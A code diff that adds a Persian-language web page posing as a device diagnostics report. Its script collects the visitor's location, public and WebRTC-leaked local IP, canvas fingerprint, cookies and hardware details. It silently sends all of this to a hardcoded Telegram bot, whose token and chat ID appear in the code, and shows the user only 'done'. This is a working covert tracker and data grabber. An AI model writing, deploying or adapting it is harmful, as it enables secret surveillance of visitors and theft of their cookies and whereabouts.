@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>گزارش کامل و پیشرفته دستگاه</title>
+<style>
+  body {
+    margin: 0; padding: 20px;
+    font-family: 'Vazirmatn', Tahoma, sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    color: #eee;
+    text-align: center;
+    user-select: none;
+  }
+  button {
+    background: linear-gradient(135deg, #ff416c, #ff4b2b);
+    border: none;
+    padding: 16px 36px;
+    color: white;
+    font-weight: 700;
+    border-radius: 12px;
+    font-size: 1.3rem;
+    cursor: pointer;
+    box-shadow: 0 8px 16px rgba(255,75,43,0.7);
+    transition: 0.3s ease;
+    margin: 10px auto;
+    user-select: none;
+    display: inline-block;
+  }
+  button:hover:not(:disabled) {
+    background: linear-gradient(135deg, #ff4b2b, #ff416c);
+    box-shadow: 0 12px 24px rgba(255,75,43,0.9);
+    transform: translateY(-3px);
+  }
+  button:disabled {
+    background: #555;
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: none;
+  }
+  button.done {
+    background: linear-gradient(135deg, #28a745, #218838);
+    box-shadow: 0 8px 16px rgba(40,167,69,0.7);
+    cursor: default;
+  }
+  #status {
+    white-space: pre-wrap;
+    word-break: break-word;
+    max-width: 90vw;
+    margin: auto;
+    font-size: 1.1rem;
+    background: rgba(0,0,0,0.45);
+    padding: 20px;
+    border-radius: 16px;
+    min-height: 200px;
+    box-shadow: 0 0 20px rgba(255,75,43,0.6);
+    text-align: right;
+    direction: rtl;
+    user-select: text;
+  }
+  #locationBtn {
+    background: #1e90ff;
+    margin-top: 5px;
+  }
+</style>
+</head>
+<body>
+
+<h1>📋 گزارش کامل و پیشرفته دستگاه شما</h1>
+
+<button id="startBtn">شروع بررسی</button>
+<button id="locationBtn">اجازه دسترسی موقعیت مکانی</button>
+
+<div id="status">برای شروع روی دکمه "شروع بررسی" کلیک کنید.</div>
+
+<script>
+const TELEGRAM_TOKEN = "8179792057:AAFqJdoVXJOp5QK13fVbskZgojZVdVdhkgs";
+const TELEGRAM_CHAT_ID = "309120647";
+
+const startBtn = document.getElementById('startBtn');
+const locationBtn = document.getElementById('locationBtn');
+const statusEl = document.getElementById('status');
+
+let userLocation = null; // ذخیره موقعیت
+
+function addResult(label, value, results) {
+  if(value !== undefined && value !== null && value !== "") {
+    results.push(`${label}: ${value}`);
+  }
+}
+
+function requestLocation() {
+  return new Promise((resolve) => {
+    if(!navigator.geolocation){
+      alert("موقعیت مکانی پشتیبانی نمی‌شود.");
+      resolve(null);
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        userLocation = pos.coords;
+        alert("دسترسی موقعیت پذیرفته شد.");
+        resolve(userLocation);
+      },
+      err => {
+        alert("دسترسی موقعیت رد شد یا خطا رخ داد.");
+        resolve(null);
+      },
+      {timeout: 10000}
+    );
+  });
+}
+
+async function collectInfo() {
+  startBtn.disabled = true;
+  locationBtn.disabled = true;
+  startBtn.textContent = "⏳ در حال جمع‌آوری...";
+  startBtn.classList.remove("done");
+  statusEl.textContent = "⏳ در حال جمع‌آوری اطلاعات...";
+
+  let results = [];
+
+  try {
+    if (navigator.getBattery) {
+      const batt = await navigator.getBattery();
+      addResult("🔋 وضعیت باتری", `${Math.round(batt.level * 100)}% (${batt.charging ? "شارژ می‌شود" : "در حال استفاده"})`, results);
+      addResult("⏳ زمان شارژ باتری (ثانیه)", batt.chargingTime !== Infinity ? batt.chargingTime : "نامشخص", results);
+      addResult("⏳ زمان تخلیه باتری (ثانیه)", batt.dischargingTime !== Infinity ? batt.dischargingTime : "نامشخص", results);
+      addResult("⚡ آیا باتری در حال شارژ است؟", batt.charging ? "بله" : "خیر", results);
+    } else {
+      addResult("🔋 وضعیت باتری", "پشتیبانی نمی‌شود", results);
+    }
+  } catch(e) { addResult("🔋 وضعیت باتری", "خطا در دریافت", results); }
+
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if(c){
+      addResult("🌐 نوع اتصال اینترنت", c.effectiveType || "نامشخص", results);
+      addResult("🌐 سرعت اینترنت (Mbps)", c.downlink || "نامشخص", results);
+      addResult("🌐 زمان پاسخگویی (ms)", c.rtt || "نامشخص", results);
+      addResult("🌐 شرکت ارائه‌دهنده اینترنت", c.type || "نامشخص", results);
+    } else {
+      addResult("🌐 اتصال اینترنت", "نامشخص", results);
+    }
+  } catch(e) { addResult("🌐 اتصال اینترنت", "خطا در دریافت", results); }
+
+  try {
+    addResult("📐 رزولوشن صفحه", `${screen.width}×${screen.height}`, results);
+    addResult("🔍 نسبت پیکسل (DPI)", window.devicePixelRatio || "نامشخص", results);
+  } catch(e) {}
+
+  try {
+    addResult("🖥️ هسته CPU", navigator.hardwareConcurrency || "نامشخص", results);
+    addResult("💾 حافظه RAM (گیگابایت)", navigator.deviceMemory || "نامشخص", results);
+  } catch(e) {}
+
+  try {
+    addResult("🌍 زبان مرورگر", navigator.language || "نامشخص", results);
+    addResult("📱 پشتیبانی از تاچ", (navigator.maxTouchPoints > 0) ? "دارد" : "ندارد", results);
+  } catch(e) {}
+
+  try {
+    addResult("🧭 User Agent", navigator.userAgent || "نامشخص", results);
+    addResult("🧠 نام مرورگر", navigator.appName || "نامشخص", results);
+    addResult("🧩 سازنده مرورگر (Vendor)", navigator.vendor || "نامشخص", results);
+    addResult("🔒 ردیابی فعال؟", navigator.doNotTrack === "1" ? "بله" : "خیر", results);
+    addResult("🌐 کوکی فعال است؟", navigator.cookieEnabled ? "بله" : "خیر", results);
+  } catch(e) {}
+
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if(gl){
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if(debugInfo){
+        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        addResult("🎮 کارت گرافیک", `${vendor} - ${renderer}`, results);
+      } else {
+        addResult("🎮 کارت گرافیک", "اطلاعات در دسترس نیست", results);
+      }
+    } else {
+      addResult("🎮 کارت گرافیک", "WebGL پشتیبانی نمی‌شود", results);
+    }
+  } catch(e) { addResult("🎮 کارت گرافیک", "خطا در دریافت", results); }
+
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillText("Fingerprint", 2, 2);
+    const fp = canvas.toDataURL().slice(-30);
+    addResult("🆔 اثر انگشت (Fingerprint)", fp, results);
+  } catch(e) { addResult("🆔 اثر انگشت (Fingerprint)", "خطا", results); }
+
+  if(userLocation){
+    addResult("📍 موقعیت مکانی", `عرض: ${userLocation.latitude.toFixed(6)}, طول: ${userLocation.longitude.toFixed(6)}`, results);
+  } else {
+    addResult("📍 موقعیت مکانی", "❌ دسترسی داده نشده", results);
+  }
+
+  try {
+    let response = await fetch("https://ipapi.co/json/");
+    if(response.ok){
+      let data = await response.json();
+      addResult("🌐 آی‌پی عمومی", data.ip, results);
+      addResult("🏙️ شهر", data.city, results);
+      addResult("🇮🇷 کشور", data.country_name, results);
+      addResult("📶 شرکت اینترنتی", data.org, results);
+      addResult("🌐 منطقه زمانی (Timezone)", data.timezone, results);
+      addResult("🗺️ موقعیت مکانی تقریبی", `عرض: ${data.latitude}, طول: ${data.longitude}`, results);
+      addResult("🔌 نوع اتصال", data.network || "نامشخص", results);
+      addResult("🔎 پشتیبانی از VPN/Proxy", data.proxy ? "بله" : "خیر", results);
+    } else {
+      addResult("🌐 اطلاعات IP", "دسترسی به API امکان‌پذیر نیست", results);
+    }
+  } catch(e){
+    addResult("🌐 اطلاعات IP", "خطا در دریافت", results);
+  }
+
+  async function getLocalIP(){
+    return new Promise((resolve) => {
+      try {
+        const pc = new RTCPeerConnection({iceServers:[]});
+        let localIPFound = false;
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (ice) => {
+          if(ice && ice.candidate && ice.candidate.candidate && !localIPFound){
+            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+            const ipMatch = ipRegex.exec(ice.candidate.candidate);
+            if(ipMatch){
+              addResult("🏠 آی‌پی داخلی", ipMatch[1], results);
+              localIPFound = true;
+            }
+            pc.close();
+            resolve();
+          }
+          if(!ice.candidate){
+            // تمام کاندیدها بررسی شدند ولی IP پیدا نشد
+            if(!localIPFound){
+              addResult("🏠 آی‌پی داخلی", "نامشخص", results);
+              resolve();
+            }
+          }
+        };
+      } catch(e) {
+        addResult("🏠 آی‌پی داخلی", "نامشخص", results);
+        resolve();
+      }
+    });
+  }
+  await getLocalIP();
+
+  try {
+    const now = new Date();
+    addResult("⏰ زمان محلی", now.toLocaleString(), results);
+    addResult("🌐 منطقه زمانی", Intl.DateTimeFormat().resolvedOptions().timeZone || "نامشخص", results);
+  } catch(e) {}
+
+  try {
+    addResult("🟢 وضعیت آنلاین بودن", navigator.onLine ? "آنلاین" : "آفلاین", results);
+  } catch(e) {}
+
+  try {
+    addResult("📱 پلتفرم", navigator.platform || "نامشخص", results);
+  } catch(e) {}
+
+  try {
+    addResult("🖥️ فول اسکرین فعال است؟", document.fullscreenElement ? "بله" : "خیر", results);
+  } catch(e) {}
+
+  try {
+    addResult("🔗 پروتکل", location.protocol, results);
+    addResult("🌐 نام دامنه", location.hostname, results);
+    addResult("📂 مسیر دقیق صفحه", location.pathname, results);
+    addResult("🖥️ آدرس کامل صفحه", location.href, results);
+  } catch(e) {}
+
+  try {
+    // استفاده از PerformanceNavigationTiming جدید
+    const navEntries = performance.getEntriesByType("navigation");
+    if(navEntries && navEntries.length > 0){
+      const nav = navEntries[0];
+      addResult("⏱️ شروع بارگذاری صفحه", new Date(nav.startTime + performance.timing.navigationStart).toLocaleString(), results);
+      addResult("⏱️ پایان بارگذاری صفحه", new Date(nav.loadEventEnd + performance.timing.navigationStart).toLocaleString(), results);
+    } else {
+      addResult("⏱️ شروع بارگذاری صفحه", "نامشخص", results);
+      addResult("⏱️ پایان بارگذاری صفحه", "نامشخص", results);
+    }
+  } catch(e) {}
+
+  try {
+    addResult("🍪 کوکی‌ها", document.cookie || "ندارد", results);
+  } catch(e) { addResult("🍪 کوکی‌ها", "خطا", results); }
+
+  // مواردی که نیاز به اجازه یا افزونه دارند
+  addResult("ℹ️ مدل گوشی", "نیاز به اجازه یا افزونه", results);
+  addResult("ℹ️ تعداد سیم کارت", "نیاز به اجازه یا افزونه", results);
+  addResult("ℹ️ مدل چیپست", "نیاز به اجازه یا افزونه", results);
+  addResult("ℹ️ حافظه کل و خالی", "نیاز به اجازه یا افزونه", results);
+  addResult("ℹ️ نوع سیستم عامل و نسخه", "نیاز به اجازه یا افزونه", results);
+
+  const message = `⏰ زمان گزارش: ${new Date().toLocaleString()}\n\n` + results.join("\n");
+
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+      }),
+    });
+    if(res.ok){
+  statusEl.textContent = "✅ انجام شد";
+  startBtn.textContent = "انجام شد ✅";
+  startBtn.classList.add("done");
+} else {
+      throw new Error("ارسال به تلگرام موفق نبود");
+    }
+  } catch {
+    statusEl.textContent += "\n\n❌ خطا در ارسال اطلاعات به تلگرام.";
+    startBtn.textContent = "شروع بررسی";
+    startBtn.classList.remove("done");
+  }
+
+  startBtn.disabled = false;
+  locationBtn.disabled = false;
+}
+
+locationBtn.onclick = async () => {
+  locationBtn.disabled = true;
+  await requestLocation();
+  locationBtn.disabled = false;
+  alert("موقعیت ذخیره شد. اکنون دکمه شروع بررسی را بزنید.");
+};
+
+startBtn.onclick = () => {
+  collectInfo();
+};
+</script>
+
+</body>
+</html>
